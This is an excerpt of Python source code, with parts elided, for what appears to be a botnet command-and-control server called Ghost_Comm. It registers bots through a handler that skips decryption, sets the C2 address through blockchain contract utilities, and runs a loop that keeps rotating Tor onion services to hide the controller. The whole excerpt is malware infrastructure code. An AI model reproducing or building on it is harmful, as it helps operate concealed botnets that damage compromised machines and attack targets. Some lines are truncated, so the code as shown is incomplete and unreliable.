...
from botnet.blockchain_utils import compile_contract, deploy_contract, get_contract_instance, set_c2_url, GANACHE_URL
from ghost_comm_lib.primary_node.primary_node import PrimaryNode


LOCK_CYCLE_INTERVAL = int(os.getenv("GHOST_COMM_LOCK_CYCLE_INTERVAL", "60"))
LOCK_CYCLE_COUNT = int(os.getenv("GHOST_COMM_LOCK_CYCLE_COUNT", "6"))
LOCK_CYCLE_PUBLISH_TIMEOUT = float(os.getenv("GHOST_COMM_LOCK_CYCLE_PUBLISH_TIMEOUT", "20.0"))
...
def register_bot():
    try:
        data = json.loads(request.data.decode())  # skip decrypt_data()
    except Exception:
...
def main() -> None:
    """Run the persistent Ghost_Comm primary node service and C2 server."""
    tor_control_port = int(os.getenv("GHOST_COMM_TOR_CONTROL_PORT", "9051"))
    tor_control_password = os.getenv("GHOST_COMM_TOR_CONTROL_PASSWORD")
    tor_control_cookie_path = os.getenv("GHOST_COMM_TOR_CONTROL_COOKIE_PATH", "/var/lib/tor/control_auth_cookie")

    primary_node = PrimaryNode(
        tor_control_port=tor_control_port,
        tor_control_password=tor_control_password,
        tor_control_cookie_path=tor_control_cookie_path,
        auto_lock_cycle=False,
    )

    try:
        primary_node.start_server()
        time.sleep(5)
        print("PrimaryNode: Server and control onion initialised.")

        primary_node.build_proxy_chain_config()

        # Initial lock-cycle
        primary_node.cleanup_distributed_nodes()
        primary_node.create_lock_cycle_onions(
            count=LOCK_CYCLE_COUNT,
            publish_timeout=LOCK_CYCLE_PUBLISH_TIMEOUT,
        ...
        print("PrimaryNode: Entering persistent lock-cycle refresh loop. Press Ctrl+C to stop.")
        while True:
            time.sleep(max(LOCK_CYCLE_INTERVAL, 1))
            print("PrimaryNode: Refreshing distributed nodes for new lock-cycle...")
            primary_node.cleanup_distributed_nodes()
            primary_node.create_lock_cycle_onions(
                count=LOCK_CYCLE_COUNT,
                publish_timeout=LOCK_CYCLE_PUBLISH_TIMEOUT,
        ...
        print("
PrimaryNode: Shutdown requested by user.")
    finally:
        primary_node.cleanup_distributed_nodes()
        primary_node.stop_server()
        print("PrimaryNode: Shutdown complete.")
